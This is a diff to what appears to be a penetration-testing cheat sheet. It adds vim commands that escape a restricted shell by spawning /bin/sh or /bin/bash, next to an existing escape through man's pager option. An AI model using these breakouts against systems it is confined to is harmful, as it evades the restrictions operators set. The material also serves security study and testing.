@@ -1380,6 +1380,12 @@ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
 MAN_DISABLE_SECCOMP=1 man -P '/bin/sh -c "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; export PATH; exec /bin/sh -i </dev/tty >/dev/tty 2>&1"' man
 ```
+##### vim Enabled
+```
+vim
+:set shell=/bin/sh|:shell
+:set shell=/bin/bash|:shell 
+```
 ### Abusing Services
 ###### Kubernetes
 ```
